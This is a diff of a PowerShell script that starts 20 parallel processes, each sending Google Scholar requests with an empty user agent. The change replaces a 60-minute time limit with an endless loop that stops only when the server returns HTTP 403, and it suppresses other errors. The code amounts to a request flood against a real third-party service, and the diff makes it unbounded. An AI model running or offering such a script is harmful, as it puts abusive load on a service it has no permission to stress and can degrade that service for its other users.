@@ -177,13 +177,16 @@ break
 }
 $count = 20
 $command = '
-$minutesToRun = 60
-$stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
-while ($stopwatch.Elapsed.TotalMinutes -lt $minutesToRun){
-Invoke-RestMethod -Uri "https://scholar.google.com:443/scholar?q=google+""&start=990" -Method Get -UserAgent ""
+while ($true) {
+try {
+$null = Invoke-RestMethod -Uri "https://scholar.google.com:443/scholar?q=google+""&start=990" -Method Get -UserAgent "" -ErrorAction Stop
 }
-$stopwatch.Stop()
-Write-Output "Loop finished after $minutesToRun minutes!"
+catch {
+if ($_.Exception.Response.StatusCode -eq 403){
+break
+}
+}
+}
 '
 1..$count | ForEach-Object{
 Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", $command
